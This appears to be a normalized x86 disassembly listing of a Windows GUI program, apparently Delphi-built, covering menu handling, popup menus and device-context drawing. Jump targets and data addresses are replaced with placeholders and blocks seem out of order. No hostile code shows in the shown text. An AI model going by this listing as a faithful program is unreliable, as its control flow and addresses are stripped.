pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_451fe0
mov eax ebx
call sub_40870c
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_451ae4
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_451a44
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4042e4
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404534
lea edx [ ebp - 0x200 ]
call sub_4087d0
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_451b78
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_451be8
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_452088
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_452088
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_452088
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_451bf4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_451ae4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_451b78
mov eax ebx
call sub_4520ac
jmp r-xdata
sub_451c5c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_451ca4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44bed4
mov eax ebx
call sub_4514b8
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44bf18
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_41a1b4
sub_451ce0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41a400
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_451ca4
sub_451d24
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_451568
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_451568
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_4551d4
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_451d80
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_451e55
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_451568
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_451568
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_450114
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450124
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_40425c
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_40425c
mov eax [ ebp - 0xc ]
pop edx
call sub_407edc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_452bcc
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451e5c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404098
retn
sub_451e68
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_451d24
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_451d80
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_451fe0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4516ec
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_451568
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_451568
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_4087b0
mov eax [ ebp + 0x10 ]
call sub_4086f4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4520ac
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43ac84
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_452088
mov [ ebx + 0x41 ] 0x1
sub_4520d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403450
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_452088
mov [ ebx + 0x41 ] 0x1
sub_452160
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_451c5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_451ae4
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_4521f0
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45222c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452256
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452278
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4527ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4527b2
lea eax [ ebp - 0x30 ]
call sub_404074
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov edx [ esi + 0x4 ]
call sub_451624
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45e7e4
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov dx [ esi + 0x4 ]
call sub_451608
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd3c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4525de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4525c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41e564
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41e3e0
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_452a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4525c8
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41e564
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_451e68
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_451568
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_451568
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_452721
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd3c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4526fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4526df
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41e564
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41e3e0
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4526e6
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41e564
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43af08
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e7e4
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_451568
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_451568
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_451568
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_451598
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413de4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_451598
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_45e488
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_45e4f0
jmp r-xdata
sub_452703
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_4527bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_413c88
pop esi
pop ebx
retn
push ebx
push sub_45222c
call sub_41b230
mov [ ebx + 0x10 ] eax
sub_452800
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451380
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_4527bc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_452874
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4527e4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45141c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4528cc
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_44d718
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_452088
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_452088
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_452914
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_44d718
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d034
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_40349c
mov edx eax
jmp r-xdata
sub_452960
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_412988
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_4528cc
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_450cd4
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4511d0
mov eax [ ebx + 0x34 ]
call sub_44e578
mov eax ebx
call sub_451b78
mov eax ebx
call sub_452914
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_44e6a8
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_452a14
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413de4
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413de4
cmp ebp [ eax ]
jne r-xdata
sub_452a50
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41dbec
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41d400
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41dbec
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41d400
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_40349c
mov edx [ r-xdata ]
call sub_40342c
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41dbec
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41d400
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_452b38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4040c8
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404334
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4045d4
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404334
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4045d4
jmp r-xdata
sub_452bcc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_404074
mov ebx 0x1
mov eax esi
call sub_404334
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_40425c
sub_452c30
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_452c89
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_452b38
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_452b38
mov eax [ ebp - 0x8 ]
pop edx
call sub_407f14
